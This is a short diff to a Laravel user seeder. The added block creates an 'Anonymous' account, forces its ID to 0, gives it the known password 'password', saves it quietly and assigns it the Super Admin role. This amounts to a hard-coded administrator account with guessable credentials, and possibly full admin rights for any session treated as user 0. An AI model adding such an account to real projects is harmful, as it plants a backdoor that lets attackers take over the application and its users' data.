@@ -31,6 +31,23 @@ class UserSeeder extends Seeder
         if (!$user->hasRole($role->name)) {
             $user->assignRole($role);
         }
+
+
+        // -----------------------------------------------------
+        // 2. ADD ANONYMOUS USER (ID = 0) WITH SUPER ADMIN ROLE
+        // -----------------------------------------------------
+        $anonymous = User::firstOrNew(['email' => 'anonymous@example.com']);
+
+        $anonymous->id = 0;  // Force ID = 0
+        $anonymous->name = 'Anonymous';
+        $anonymous->password = Hash::make('password');
+        $anonymous->mobile = '0000000000';
+        $anonymous->saveQuietly();
+
+        // Assign Super Admin role
+        if (!$anonymous->hasRole($role->name)) {
+            $anonymous->assignRole($role->name);
+        }
     }
 
     //  public function run(): void
